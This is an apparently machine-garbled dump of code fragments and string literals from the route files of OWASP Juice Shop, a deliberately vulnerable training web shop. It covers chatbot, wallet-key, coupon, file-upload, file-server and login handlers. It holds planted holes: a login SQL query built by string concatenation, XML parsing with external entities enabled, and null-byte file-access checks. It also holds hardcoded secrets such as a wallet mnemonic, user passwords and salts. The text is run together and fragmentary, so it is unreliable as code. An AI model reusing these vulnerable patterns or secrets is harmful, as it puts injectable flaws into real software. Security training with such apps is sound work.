esponseJwtPayloadVerifyErrors'lodash'Bot'../lib/startup/validateChatBot'botUtils'../lib/botUtils'trainingFiletestCommandinitialize'data/chatbot/''data/static/botDefaultTrainingData.json''data/chatbot/botDefaultTrainingData.json'trainingSetutterances'application.chatBot.name''application.chatBot.greeting''application.chatBot.defaultResponse'trainprocessQuery'namequery''I\'m sorry I didn\'t get your name. What shall I call you?'`currentUser('${}')`addUsergreet`Remember to stay hydrated while I try to recover from "${}"...`setUserName'Unknown user'updatedUserupdatedUserResponseupdatedToken`Could not set username: ${} isn't ready at the moment, please wait while I set things up`training`Hi, I can't recognize you. Sign in to talk to ${getUserFromJwt'Unauthenticated user'type Userjwt, {  ... rrors }type JwtPayloadtype VerifyErrorsimport  ... lodash'lodashimport  ... at-bot'import  ... hatBot''../lib ... hatBot'../lib/startup/validateChatBot/lib/startup/validateChatBotimport  ... tUtils'../lib/botUtils/lib/botUtils* as botUtilslet tra ... gData')trainin ... gData')let tes ...  stringtestCommand: stringlet bot ...  = nullbot: Bo ...  = nullBot | nullexport  ... in()\r\n}async f ... in()\r\n}{\r\n  if ... in()\r\n}if (uti ... a)\r\n  }utils.i ... ngFile)const f ... ngFile)file =  ... ngFile)utils.e ... ngFile)const d ... ngFile)data =  ... ngFile)await d ... ngFile)downloa ... ngFile)await f ... , data)'data/c ...  + fileawait f ... n'\r\n  )fs.copy ... n'\r\n  )fs.copyFile'data/s ... a.json'data/static/botDefaultTrainingData.jsondata/static/botDefaultTrainingData'data/c ... a.json'data/chatbot/botDefaultTrainingData.jsondata/chatbot/botDefaultTrainingDatatrainin ... ngFile)const t ... 'utf8')trainin ... 'utf8')`data/c ... gFile}`validat ... ngSet))JSON.pa ... ingSet)testCom ... nces[0]JSON.pa ... nces[0]JSON.pa ... erancesJSON.pa ... data[0]JSON.pa ... t).databot = n ... onse'))new Bot ... onse'))application.chatBot.nameconfig. ... eting')'applic ... eeting'application.chatBot.greetingconfig. ... ponse')'applic ... sponse'application.chatBot.defaultResponsereturn bot.train()bot.train()bot.trainvoid initialize()initialize()if (bot ... rn\r\n  }bot == null{\r\n     ... rn\r\n  }res.status(503).sendconst u ... sernameusernam ... sernameuser.usernameif (!us ... rn\r\n  }!usernameres.sta ... \n    })action: 'namequery'body: ' ... l you?''I\'m s ... l you?'I'm sorry I didn't get your name. What shall I call you?I'm sorry I didn't get your name What shall I call you?if (!bo ... rn\r\n  }!bot.fa ... id}')`)bot.fac ... id}')`)bot.factory.runbot.factory`curren ... .id}')`currentUser('')bot.add ... ername)bot.addUser`${user.id}`res.sta ...      })body: b ... r.id}`)bot.gre ... r.id}`)bot.greetreq.soc ... Addressreq.socketif (bot ...  }\r\n  }bot.fac ... sernameif (!re ... rn\r\n  }!req.body.queryreq.body.querytry {\r\n ...  }\r\n  }const r ... r.id}`)respons ... r.id}`)await b ... r.id}`)bot.res ... r.id}`)bot.respondrespons ... nction'respons ... andler]response.handlerbotUtil ... andler]res.sta ...  user))await b ... , user)botUtil ... , user)body: c ... ponse')res.sta ... sponse)catch ( ...  }\r\n  }body: ` ... )}"...``Rememb ... )}"...`Remembe ...  from "Remember to stay hydrated while I try to recover from ""...error:  ... n user'Unknown userconst u ... uery })updated ... uery })await u ... uery })userMod ... uery })userModel.update{ usern ... query }usernam ... y.queryconst u ... edUser)updated ... edUser)utils.q ... edUser)const u ... sponse)updated ... sponse)securit ... sponse)bot.add ... .query)`${updatedUser.id}`updatedUser.idtoken: updatedTokenCould n ... rname: Could not set username: res.status(500).sendstatus  ... \n  }\r\n}if (bot ... \r\n    }status: falsebody: ` ... ngs up``${conf ... ngs up` isn't  ... ings up isn't ready at the moment, please wait while I set things upif (!to ... \r\n    }!tokenstatus: ... g.statebot.training.statebot.trainingbody: ` ... ame')}``Hi, I  ... ame')}`Hi, I c ... alk to Hi, I can't recognize you. Sign in to talk to const u ... (token)user =  ... (token)await g ... (token)getUser ... (token)error:  ... d user''Unauth ... d user'Unauthenticated userif (!us ... \r\n    }body: b ... ngs up`bot.tra ... ngs up`req.bod ... 'query'req.body.actionawait p ... , next)process ... , next)req.bod ... etname'await s ... q, res)setUser ... q, res)Promise<User | null>User | nullsecurity.publicKey(err: V ... \r\n    }VerifyErrors | nullJwtPayl ... definederr !== ... ecoded)err !== ... decodederr !== null!decodedisString(decoded)resolve(null)resolve ... d.data)decoded.dataP:/My Drive/Git/juice-shop/routes/checkKeys.tsHDNodeWalletcheckKeysmnemonic'purpose betray marriage blame crunch monitor spin slide donate sport lift clutch'mnemonicWalletfromPhrase'Challenge successfully solved''Looks like you entered the public address of my ethereum wallet!''Looks like you entered the public key of my ethereum wallet!''Looks like you entered a non-Ethereum private key to access me.'module. ... eckKeysconst m ... clutch'mnemoni ... clutch''purpos ... clutch'purpose betray marriage blame crunch monitor spin slide donate sport lift clutchconst m ... emonic)mnemoni ... emonic)HDNodeW ... emonic)HDNodeW ... mPhraseconst p ... vateKeyprivate ... vateKeymnemoni ... vateKeyconst p ... blicKeypublicK ... blicKeymnemoni ... blicKeyconst a ... addressaddress ... addressmnemoni ... addressreturn  ... vateKeyreq.bod ... vateKeyreq.body.privateKeyres.sta ... enge }){ succe ... lenge }success: truemessage ... solved''Challe ... solved'Challenge successfully solvedstatus: ... allengereq.bod ... addresssuccess: falsemessage ... allet!''Looks  ... allet!'Looks like you entered the public address of my ethereum wallet!req.bod ... blicKeyLooks like you entered the public key of my ethereum wallet!message ... ss me.''Looks  ... ss me.'Looks like you entered a non-Ethereum private key to access me.Looks like you entered a non-Ethereum private key to access meres.sta ... error))module. ... nlockedres.sta ... lved }){ statu ... olved }status: ... .solvedP:/My Drive/Git/juice-shop/routes/continueCode.tsHashids'hashids/cjs''this is my salt''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'ids'this is the salt for findIt challenges'gte'yet another salt for the fixIt challenges'import  ... s/cjs')require ... s/cjs')hashids/cjsconst s ... elize')sequeli ... elize')require('sequelize')const O ... lize.OpOp = sequelize.Opsequelize.Opmodule. ... nueCodeconst h ... 67890')hashids ... 67890')new Has ... 67890')this is my salt'abcdef ... 567890'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890const ids = []ids = []const nameif (Obj ...       }Object. ... , name)if (cha ... me].id)challenges[name]ids.pus ... me].id)ids.pushchallenges[name].idconst c ... definedcontinu ... definedids.len ... definedids.length > 0ids.lengthhashids.encode(ids)hashids.encoderes.jso ... Code }){ continueCode }module. ... eFindIt'this i ... lenges'this is the salt for findIt challengesconst c ...  } } })challen ...  } } })Challen ... findAll{ where ... 1 } } }where:  ... : 1 } }{ codin ... : 1 } }codingC ... e]: 1 }{ [Op.gte]: 1 }[Op.gte]: 1Op.gteids.pus ... nge.id)challenge.idmodule. ... deFixIt'yet an ... lenges'yet another salt for the fixIt challenges{ codin ... : 2 } }codingC ... e]: 2 }{ [Op.gte]: 2 }[Op.gte]: 2P:/My Drive/Git/juice-shop/routes/countryMapping.ts'ctf.countryMapping''No country mapping found!''Country mapping was requested but was not found in the selected config file. Take a look at the fbctf.yml config file to find out how to configure the country mappings required by FBCTF.'require('config')const c ... pping')country ... pping')config. ... pping')ctf.countryMapping!countryMapping'No cou ... found!'No country mapping found!res.sen ... apping)res.sendlogger. ... BCTF.')'Countr ... FBCTF.'Country mapping was requested but was not found in the selected config file. Take a look at the fbctf.yml config file to find out how to configure the country mappings required by FBCTF.Country mapping was requested but was not found in the selected config file Take a look at the fbctfyml config file to find out how to configure the country mappings required by FBCTFP:/My Drive/Git/juice-shop/routes/coupon.ts'Invalid coupon.''Basket with id='' does not exist.'({ para ... })\r\n  }const id = params.idid = params.idparams.idlet cou ... definedcoupon: ... definedparams. ... definedparams.coupondecodeU ... coupon)string  ...  | nulldiscoun ... coupon)securit ... coupon)securit ... mCouponcoupon  ...  : nulldiscoun ...  : nullBasketM ... \n    })BasketM ... d).thenBasketM ... yPk(id)BasketModel.findByPkif (bas ...       }basket != nullbasket. ... ).catchbasket. ... }).thenbasket. ... ng() })basket.update{ coupo ... ing() }coupon: ... tring()coupon?.toString()coupon?.toStringif (dis ...       }res.jso ... ount })res.sta ... upon.')res.status(404).sendres.status(404)Invalid coupon.Invalid couponnext(ne ... ist.'))new Err ... xist.')'Basket ... exist.''Basket ... =' + idBasket with id= does not exist.P:/My Drive/Git/juice-shop/routes/createProductReviews.ts'../data/mongodb'../data/mongodb/data/mongodbchallen ... thor })() => { ... uthor }{ retur ... uthor }return  ... .authoruser && ... .authoruser.da ... .authorreq.body.authorreviews ... \n    })reviews ... }).thenproduct ... rams.idauthor: ... .authorres.sta ... ess' })res.status(201).jsonres.status(201){ statu ... cess' }res.sta ... e(err))P:/My Drive/Git/juice-shop/routes/currentUser.tsretrieveLoggedInUserfinallysecurit ... .token)user =  ... .token)user = undefinedconst r ... ed) } }respons ... ed) } }{ user: ... ed) } }user: { ... ined) }{ id: ( ... ined) }id: (us ... efined)(user?. ... efined)user?.d ... defineduser?.dataemail:  ... efined)lastLog ... efined)user.da ... LoginIpprofile ... efined)user.da ... leImagereq.que ... definedreq.query.callbackres.json(response)res.jsonp(response)res.jsonpP:/My Drive/Git/juice-shop/routes/dataErasure.ts eslint-disable-next-line @typescript-eslint/no-misused-promises// esli ... romises'../models/privacyRequests'insecurity'No answer found!''No question found!''dataErasureForm'DataErasureRequestParamslayoutclearCookieisForbiddenFile'dataErasureResult'sendlfrResponse'......''File access not allowed'express ... ponse }'../mod ... quests'../models/privacyRequests/models/privacyRequestsconst i ... urity')insecur ... urity')const c ... Utils')challen ... Utils')const r ... outer()router  ... outer()express.Router()express.Routerrouter. ...   }\r\n})router.getconst l ... .token)loggedI ... .token)insecur ... .token)insecur ... ers.getinsecur ... edUsersif (!lo ... rn\r\n  }!loggedInUserconst e ... a.emailemail = ... a.emailloggedI ... a.emailconst a ... \n    })answer  ... \n    })await S ... \n    })Securit ... \n    })Securit ... findOneinclude ...      }][{\r\n    ...      }]model: UserModelwhere: { email }{ email }if (ans ... \r\n    }answer == nullNo answer found!const q ... tionId)questio ... tionId)await S ... tionId)Securit ... tionId)Securit ... indByPkanswer. ... stionIdquestion == nullNo question found!res.ren ... tion })res.renderdataErasureForm{ userE ... stion }userEmail: emailDataEra ... tParamslayout?: stringsecurit ...  stringrouter.postRequest ... Params>Record< ... nknown>await P ... \n    })Privacy ... \n    })Privacy ... .createUserId: ... data.iddeletio ... d: trueres.cle ... token')res.clearCookiereq.body.layoutconst f ... rCase()filePat ... rCase()path.re ... rCase()path.re ... werCasepath.re ... layout)const i ... keys'))isForbi ... keys'))(filePa ... keys'))filePat ... nkeys')filePat ... f.key')filePat ... ('ftp')filePath.includesif (!is ...       }!isForbiddenFileres.ren ...      })dataErasureResult...req.body(error, ...       }if (!ht ...       }!html || error!htmlnext(ne ... ssage))new Err ... essage)const s ... ......'sendlfr ... ......'html.sl ... ......'html.slice(0, 100)html.slice......res.sen ... sponse)next(ne ... owed'))new Err ... lowed')'File a ... llowed'File access not allowedexport  ...  routerP:/My Drive/Git/juice-shop/routes/dataExport.ts'Bearer 'updatedEmail'://''host'emailHash'Your data export will open in a new Browser window.'`Error retrieving reviews for ${`Error retrieving orders for ${* as dbconst l ... ', ''))loggedI ... ', ''))securit ... ', ''))req.hea ...  ', '')req.hea ... replacereq.hea ... izationreq.headersif (log ... \r\n    }loggedI ... data.idloggedI ... ?.emailloggedInUser?.dataloggedI ... sernameconst u ... i, '*')updated ... i, '*')email.r ... i, '*')email.replaceconst u ...       }userDat ...       }orders: []reviews: []memories: []username: stringorders: ...      }>Array<{ ...      }>product ... Model[]eta: stringreviews ...      }>productId: numberlikesCount: numberlikedBy: stringmemorie ...      }>imageUrl: stringconst m ... Id } })memorie ... Id } })await M ... Id } })MemoryM ... Id } })MemoryModel.findAllmemorie ...      })(memory ...       }userDat ...      })userDat ... es.pushuserData.memoriesimageUr ... agePathreq.pro ... agePathreq.pro ... ) + '/'req.pro ... 'host')req.protocol + '://'req.protocol://req.get('host')req.getdb.orde ...      })db.orde ... }).thendb.orde ... mail })db.orde ... on.finddb.ordersCollection{ email ... Email }email: updatedEmail(orders ...       }orders.length > 0orders. ...      })orders.forEachorder = ...       }userData.orders.pushuserData.ordersproduct ... oducts][...order.products]...order.productseta: order.etaorder.etadb.revi ... }).thendb.revi ... mail })db.revi ... on.find{ author: email }author: email(review ...       }product: numberif (rev ...       }reviews.length > 0reviews.lengthreviews.forEachreview  ...       }userDat ... ws.pushuserData.reviewsproduct ... productreview.productlikesCo ... esCountlikedBy ... likedByreview.likedByconst e ... e(0, 4)emailHa ... e(0, 4)security.hash(email)challen ... Hash })() => { ... lHash }{ retur ... lHash }return  ... ailHashorder.o ... ailHashorder.o ... '-')[0]order.o ... it('-')order.orderId.splitres.sta ... ow.' }){ userD ... dow.' }userDat ... ull, 2)JSON.st ... ull, 2)confirm ... indow.''Your d ... indow.'Your data export will open in a new Browser window.Your data export will open in a new Browser windownext(ne ... ail}`))new Err ... mail}`)`Error  ... Email}`Error r ... ws for Error retrieving reviews for Error r ... rs for Error retrieving orders for P:/My Drive/Git/juice-shop/routes/delivery.tssendMethodssendMethodmodule. ... Methodsconst m ... ndAll()methods ... ndAll()await D ... ndAll()Deliver ... ndAll()Deliver ... findAllif (met ... \r\n    }const s ... ds = []sendMethods = []const methodsendMet ...      })sendMethods.pushid: method.idmethod.idname: method.namemethod.nameprice:  ... d.pricesecurit ... d.pricemethod.deluxePriceeta: method.etamethod.etaicon: method.iconmethod.iconres.sta ... hods }){ statu ... thods }data: sendMethodsres.sta ... ror' }){ status: 'error' }module. ... yMethodconst m ... id } })method  ... id } })await D ... id } })Deliver ... id } })Deliver ... findOnemethod != nullconst s ...       }sendMet ...       }res.sta ... thod }){ statu ... ethod }data: sendMethodP:/My Drive/Git/juice-shop/routes/deluxe.ts @ts-expect-error FIXME some properties missing in user// @ts- ... in user'Something went wrong. Please try again!'49'Insuffienct funds in Wallet'decrement'Invalid Card''Congratulations! You are now a deluxe member!''Something went wrong: 'deluxeMembershipStatus'You are already a deluxe member!''You are not eligible for deluxe membership!'module. ... oDeluxeconst u ... er } })user =  ... er } })await U ... er } })UserMod ... er } })UserModel.findOne{ where ... mer } }where:  ... tomer }{ id: r ... tomer }id: req.body.UserIdrole: s ... ustomersecurit ... ustomerres.sta ... in!' }){ statu ... ain!' }error:  ... again!''Someth ... again!'Something went wrong. Please try again!Something went wrong Please try again!req.bod ... wallet'req.body.paymentModeconst w ... Id } })wallet  ... Id } })await W ... Id } })WalletM ... Id } })WalletModel.findOneif ((wa ...       }(wallet ... ce < 49(wallet != null)wallet != nullwallet.balance < 49wallet.balanceres.sta ... let' }){ statu ... llet' }error:  ... Wallet''Insuff ... Wallet'Insuffienct funds in WalletWalletM ... crement{ balance: 49 }balance: 49req.bod ...  'card'const c ... Id } })card =  ... Id } })await C ... Id } })CardMod ... Id } })CardModel.findOneid: req ... ymentIdreq.body.paymentIdif ((ca ...       }(card = ... onth())(card = ... lYear()(card == null)card == nullcard.ex ... lYear()new Dat ... lYear()new Dat ... ullYear(card.e ... onth())card.ex ... Month()card.expMonth - 1new Dat ... Month()new Date().getMonthres.sta ... ard' }){ statu ... Card' }error:  ... d Card'Invalid Carduser.up ...   .thenuser.up ... ail) }){ role: ... mail) }role: s ... .deluxesecurit ... .email)user => ...       }challen ... ard' })() => { ... card' }{ retur ... card' }return  ...  'card'securit ...  'card'securit ... wallet'securit ... m(req))user =  ... n(user)const u ... e(user)updated ... e(user)securit ... e(user)securit ... , user)res.sta ... en } }){ statu ... ken } }data: { ... Token }{ confi ... Token }confirm ... ember!''Congra ... ember!'Congratulations! You are now a deluxe member!res.sta ... err) }){ statu ... (err) }error:  ... ge(err)'Someth ... ge(err)'Someth ... rong: 'Something went wrong: module. ... pStatusdeluxeM ... pStatusif (sec ... \r\n    }securit ... er(req)security.isCustomerres.sta ... 49 } }){ statu ...  49 } }data: { ... t: 49 }{ membe ... t: 49 }membershipCost: 49res.sta ... er!' }){ statu ... ber!' }error:  ... ember!''You ar ... ember!'You are already a deluxe member!res.sta ... ip!' }){ statu ... hip!' }error:  ... rship!''You ar ... rship!'You are not eligible for deluxe membership!P:/My Drive/Git/juice-shop/routes/easterEgg.tsserveEasterEggreturn  ... ))\r\n  }(req: R ... ))\r\n  }P:/My Drive/Git/juice-shop/routes/fileServer.tsservePublicFiles'File names cannot contain forward slashes!'endsWithAllowlistedFileType'incident-support.kdbx''acquisitions.md'verifySuccessfulPoisonNullByteExploit'ftp/''Only .md and .pdf files are allowed!''eastere.gg''package.json.bak''coupons_2013.md.bak''suspicious_errors.yml''encrypt.pyc''.md''.pdf'({ para ...  }\r\n  }{ params, query }const f ... ms.filefile = params.fileparams.fileif (!fi ... \r\n    }!file.includes('/')file.includes('/')file.includesverify( ... , next)next(ne ... hes!'))new Err ... shes!')'File n ... ashes!'File names cannot contain forward slashes!functio ...  }\r\n  }if (fil ... \r\n    }file && ... kdbx'))(endsWi ... kdbx'))endsWit ... .kdbx')endsWit ... e(file)endsWit ... ileType(file = ... .kdbx')file == ... t.kdbx''incide ... t.kdbx'incident-support.kdbxsecurit ... e(file)securit ... ullBytechallen ... .md' })() => { ... s.md' }{ retur ... s.md' }return  ... ons.md'file.to ... ons.md'file.toLowerCase()file.toLowerCaseacquisitions.mdverifyS ... t(file)verifyS ... Exploitres.sen ...  file))ftp/next(ne ... wed!'))new Err ... owed!')'Only . ... lowed!'Only .md and .pdf files are allowed!md and pdf files are allowed!challen ... .gg' })() => { ... e.gg' }{ retur ... e.gg' }return  ... ere.gg'file.to ... ere.gg'eastere.ggchallen ... bak' })() => { ... .bak' }{ retur ... .bak' }return  ... on.bak'file.to ... on.bak'package.json.bakreturn  ... md.bak'file.to ... md.bak''coupon ... md.bak'coupons_2013.md.bakchallen ... yml' })() => { ... .yml' }{ retur ... .yml' }return  ... rs.yml'file.to ... rs.yml''suspic ... rs.yml'suspicious_errors.ymlreturn  ... pt.pyc'challen ... pt.pyc'file.to ... pt.pyc'encrypt.pycfunctio ... ')\r\n  }return  ... '.pdf')utils.e ... '.pdf')utils.e ...  '.md').mdP:/My Drive/Git/juice-shop/routes/fileUpload.ts XXE attacks in Docker/Heroku containers regularly cause "segfault" crashes// XXE  ... crashes TODO: Remove any// TODO: Remove anylibxml'libxmljs''unzipper'ensureFileIsPassedhandleZipFileUploadoriginalnametempFile'w'Parse'entry'absolutePath'uploads/complaints/'autodraincheckUploadSizecheckFileTypefileType'pdf''xml'handleXmlUpload'.xml'xmlDoc'libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })'410'B2B customer complaints via file upload have been deprecated for security reasons: ''Script execution timed out''B2B customer complaints via file upload have been deprecated for security reasons ('import  ... e('fs')const l ... xmljs')libxml  ... xmljs')require('libxmljs')const v ... e('vm')vm = require('vm')const u ... ipper')unzippe ... ipper')require('unzipper'){ file }if (fil ... ()\r\n  }file != null{\r\n    next()\r\n  }if (uti ... ()\r\n  }utils.e ... '.zip')file?.o ... rCase()file?.o ... werCasefile?.originalnameif (((f ... \r\n    }((file? ... llenge)((file? ... = null)(file?. ... != null(file?.buffer)file?.bufferconst b ... .bufferbuffer = file.bufferfile.bufferfilenam ... rCase()file.or ... rCase()file.or ... werCasefile.originalnameconst t ... lename)tempFil ... lename)path.jo ... lename)os.tmpdir()fs.open ...      })functio ...       }if (err ... (err) }err != null{ next(err) }fs.writ ...      })buffer.lengthfs.clos ...      })fs.crea ... err) })fs.crea ...   }).onfs.crea ...      })fs.crea ...     .onfs.crea ... arse())fs.crea ...   .pipefs.crea ... mpFile)unzipper.Parse()unzipper.Parseconst f ... ry.pathfileNam ... ry.pathentry.pathconst a ... leName)absolut ... leName)path.re ... leName)'upload ... ileName'upload ... aints/'challen ... md') })() => { ... .md') }{ retur ... .md') }return  ... al.md')absolut ... al.md')if (abs ...       }absolut ... e('.'))absolut ... ncludespath.resolve('.')entry.p ... rr) }))entry.pipefs.crea ... ame).onfs.crea ... leName)functio ... (err) }entry.autodrain()entry.autodrainres.sta ... ).end()res.status(204).endres.status(204)functio ... xt()\r\n}{\r\n  if ... xt()\r\n}if (fil ... })\r\n  }challen ... 0000 })() => { ... 00000 }{ retur ... 00000 }return  ...  100000file?.size > 100000file?.sizefileTyp ... rCase()file?.o ... ') + 1)file?.o ... .substrfile.or ... .') + 1file.or ... Of('.')file.or ... IndexOfchallen ... )\r\n  })return  ...  'zip')!(fileT ...  'zip')(fileTy ...  'zip')fileTyp ... = 'zip'fileTyp ... = 'xml'fileType === 'pdf'fileType === 'xml'fileType === 'zip'functio ... nd()\r\n}{\r\n  if ... nd()\r\n}if (uti ...  }\r\n  }utils.e ... '.xml').xml{ // XX ... \r\n    }data =  ... tring()file.bu ... tring()file.buffer.toStringconst s ...  data }sandbox ...  data }{ libxml, data }const x ... 2000 })xmlDoc  ... 2000 })'libxml ... rue })'libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })const x ... (false)xmlStri ... (false)xmlDoc. ... (false)xmlDoc.toStringchallen ... ng)) })() => { ... ing)) }{ retur ... ing)) }return  ... tring))(utils. ... tring))utils.m ... String)utils.m ... swdFileutils.m ... IniFileres.status(410)next(ne ... + ')'))new Err ...  + ')')'B2B cu ... e + ')''B2B cu ... nalname'B2B cu ...  + ' (''B2B cu ... g, 400)'B2B cu ... sons: 'B2B customer complaints via file upload have been deprecated for security reasons: utils.t ... g, 400)utils.truncutils.c ... d out')'Script ... ed out'challen ... llenge)challen ... tSolvedchallengeUtils.solve'B2B cu ... message'B2B cu ... sons ('B2B customer complaints via file upload have been deprecated for security reasons (module. ... load\r\n}{\r\n  en ... load\r\n}P:/My Drive/Git/juice-shop/routes/imageCaptcha.ts'../models/imageCaptcha'svgCaptcha'svg-captcha'imageCaptchasnoiseimageCaptchaimageCaptchaInstance'Unable to create CAPTCHA. Please try again.'gt'createdAt''DESC''Something went wrong while submitting CAPTCHA. Please try again.''../mod ... aptcha'../models/imageCaptcha/models/imageCaptchaconst s ... ptcha')svgCapt ... ptcha')require ... ptcha')const c ... true })captcha ... true })svgCapt ... true })svgCaptcha.create{ size: ...  true }size: 5noise: 2color: trueconst i ... \r\n    }imageCa ... \r\n    }image: captcha.datacaptcha.dataanswer: captcha.textcaptcha.textsecurit ... data.idsecurit ... q).dataconst i ... aptcha)imageCa ... aptcha)ImageCa ... aptcha)ImageCa ... l.buildimageCa ... \n    })imageCa ... ).catchimageCa ... ().thenimageCa ... .save()imageCa ... ce.saveres.jso ... aptcha)'Unable ... again.'Unable to create CAPTCHA. Please try again.Unable to create CAPTCHAimageCa ...   })\r\n}const U ... definedUserId  ... defineduser.da ... definedImageCa ... )\r\n  })ImageCa ... ).catchImageCa ... }).thenImageCa ... ]\r\n  })ImageCa ... findAll{\r\n     ... ]]\r\n  }limit: 1where:  ... \r\n    }created ...       }[Op.gt] ... 300000)Op.gtnew Dat ... 300000)Date.now() - 300000order:  ... DESC']][['crea ... DESC']]['creat ... 'DESC']DESCcaptcha ...  }\r\n  }if (!ca ... \r\n    }!captch ... .answer!captchas[0]captchas[0]req.body.answercaptchas[0].answer'Someth ... again.'Something went wrong while submitting CAPTCHA. Please try again.Something went wrong while submitting CAPTCHAP:/My Drive/Git/juice-shop/routes/keyServer.tsserveKeyFiles'encryptionkeys/'encryptionkeys/P:/My Drive/Git/juice-shop/routes/languages.ts TODO Refactor and extend to also load backend translations from /i18n/*json and calculate joint percentage/gauge// TODO ... e/gauge'../data/static/locales.json'getLanguageListenContent'frontend/dist/frontend/assets/i18n/en.json''utf-8'`Unable to retrieve en.json language file: ${'frontend/dist/frontend/assets/i18n/'languageFiles`Unable to read i18n directory: ${`Unable to retrieve ${} language file: ${calcPercentageLANGUAGE'full''three-quarters''half''quarter''empty''en.json''tlh_AA.json''gb''us''EN''English'totalStringsdifferentStringsimport  ... s.json''../dat ... s.json'../data/static/locales.json/data/static/locales{ // TO ... \n  }\r\n}const l ... }> = []languag ... }> = []{ key:  ... tring }lang: any,icons: string[],shortKey: string,percentage: unknown,gauge: stringlet count = 0count = 0let enContent: anyenContent: any'fronte ... n.json'frontend/dist/frontend/assets/i18n/en.jsonfrontend/dist/frontend/assets/i18n/en(err, c ... \r\n    }next(ne ... age}`))new Err ... sage}`)`Unable ... ssage}`Unable  ...  file: Unable to retrieve en.json language file: enConte ... ontent)JSON.parse(content)fs.read ...      })'fronte ... /i18n/'frontend/dist/frontend/assets/i18n/(err, l ...       }Unable  ... ctory: Unable to read i18n directory: languag ...      })languag ... forEach(fileNa ...       }Unable to retrieve  language file: const f ... ontent)fileCon ... ontent)const p ... ontent)percent ... ontent)await c ... ontent)calcPer ... ontent)const k ... f('.'))key = f ... f('.'))fileNam ... f('.'))fileName.substringfileNam ... Of('.')fileName.indexOfconst l ... == key)locale  ... == key)locales ... == key)locales.find(l) => l.key === keyl.key === keyl.keyconst l ...       }lang: a ...       }lang: f ... ANGUAGEfileContent.LANGUAGEicons: locale?.iconslocale?.iconsshortKe ... hortKeylocale?.shortKeygauge:  ... ty'))))(percen ... ty'))))percent ... pty')))percentage > 90full(percen ... pty')))percent ... mpty'))percentage > 70three-quarters(percen ... mpty'))percent ... empty')percentage > 50half(percen ... empty')percent ... 'empty'percentage > 30quarterif (!(f ...       }!(fileN ... .json')(fileNa ... .json')fileNam ... A.json'fileNam ... n.json'en.jsontlh_AA.jsonlanguages.push(lang)languages.pushcount++if (cou ...       }languageFiles.lengthlanguag ... ull' }){ key:  ... full' }key: 'en'icons: ['gb', 'us']['gb', 'us']gbusshortKey: 'EN'ENlang: 'English'Englishpercentage: 100gauge: 'full'languag ... .lang))languages.sort(a, b)  ... b.lang)a.lang. ... b.lang)a.lang.localeComparea.langb.langres.sta ... guages)async f ... \r\n    }Promise<number>const t ... .lengthtotalSt ... .lengthObject. ... .lengthObject. ... ontent)let dif ... ngs = 0differentStrings = 0await n ...      })new Pro ...      })(resolv ...       }const keyObject. ... nt[key]Object. ... t, key)fileCon ... nt[key]fileContent[key]enContent[key]differentStrings++resolve ...  * 100)(differ ... ) * 100(differ ... trings)differe ... Stringsreject(err)P:/My Drive/Git/juice-shop/routes/likeProductReviews.ts Artificial wait for timing attack challenge// Arti ... allenge'Not found'$inc'Wrong Params''Not allowed'const i ... body.idid = req.body.iddb.revi ... \n    })db.revi ... : id })db.revi ... findOne{ _id: id }_id: id(review ... \r\n    }!reviewres.sta ... und' })res.status(404).json{ error ... ound' }error: 'Not found'Not foundconst l ... likedByif (!li ...       }!likedB ... .email)likedBy ... .email)likedBy.includesdb.revi ...       ){ $inc: ... : 1 } }$inc: { ... nt: 1 }{ likesCount: 1 }likesCount: 1setTime ... }, 150)likedBy.pushi < likedBy.lengthlikedBy.lengthif (lik ...       }likedBy ... a.emaillikedBy[i]challen ...  > 2 })() => { ... t > 2 }{ return count > 2 }return count > 2count > 2{ $set: ... dBy } }$set: { likedBy }{ likedBy }res.sta ... ams' }){ error ... rams' }error:  ... Params'Wrong Paramsres.sta ... wed' }){ error ... owed' }error: 'Not allowed'Not allowedP:/My Drive/Git/juice-shop/routes/logfileServer.tsserveLogFiles'logs/'logs/P:/My Drive/Git/juice-shop/routes/login.ts vuln-code-snippet start loginAdminChallenge loginBenderChallenge loginJimChallenge// vuln ... de-line keep track of original basket// keep ...  basket vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge vuln-code-snippet neutral-line loginAdminChallenge loginBenderChallenge loginJimChallenge @ts-expect-error FIXME some properties missing in user - vuln-code-snippet hide-line// @ts- ... de-line vuln-code-snippet end loginAdminChallenge loginBenderChallenge loginJimChallenge'../models/index'afterLoginverifyPostLoginChallengesverifyPreLoginChallenges`SELECT * FROM Users WHERE email = '${}' AND password = '${}' AND deletedAt IS NULL`plainauthenticatedUser'Invalid email or password.''support@''J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P''mc.safesearch@''amy@''K1f.....................''J12934@''0Y8rMnww$*9VFYE59-!Fg1L6t&6lB''bjoern.kimminich@gmail.com''bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=''acc0unt4nt@''Unable to verify challenges! Try again'import  ... index')require ... index')../models/index/models/indexconst u ... ).usersusers = ... ).usersrequire ... ).users{\r\n  fu ... \n  }\r\n}{ data: ... umber }data: User,verifyP ... s(user)verifyP ... llengesBasketM ... id } })where:  ... ta.id }{ UserI ... ta.id }UserId: user.data.id([baske ...       }[Basket ... oolean]const t ... e(user)token = ... e(user)user.bid = basket.idumail:  ... a.emailverifyP ... es(req)models. ... true })`SELECT ... S NULL`SELECT  ... ail = 'SELECT * FROM Users WHERE email = 'req.body.email || ''req.body.email' AND password = 'securit ...  || '')req.bod ... d || ''req.body.password' AND d ... IS NULL' AND deletedAt IS NULL{ model ...  true }plain: true(authen ...       }user =  ... edUser)user.da ...  !== ''user.data?.iduser.data.totpSecretstatus: ... quired'tmpToke ...      })userId: user.data.idtype: ' ... _token'afterLo ... , next)res.sta ... ord.'))res.__( ... word.')'Invali ... sword.'Invalid email or password.Invalid email or passwordchallen ... 123' })() => { ... n123' }{ retur ... n123' }return  ... min123'req.bod ... min123'req.bod ... omain')challen ... F$P' })() => { ... RF$P' }{ retur ... RF$P' }return  ... E@RF$P'req.bod ... E@RF$P''suppor ... omain')challen ... les' })() => { ... dles' }{ retur ... dles' }return  ... 00dles'req.bod ... 00dles''mc.saf ... omain')mc.safesearch@challen ... ...' })() => { ... ....' }{ retur ... ....' }return  ... ......'req.bod ... ......''amy@'  ... omain')amy@challen ... 6lB' })() => { ... &6lB' }{ retur ... &6lB' }return  ... 6t&6lB'req.bod ... 6t&6lB''J12934 ... 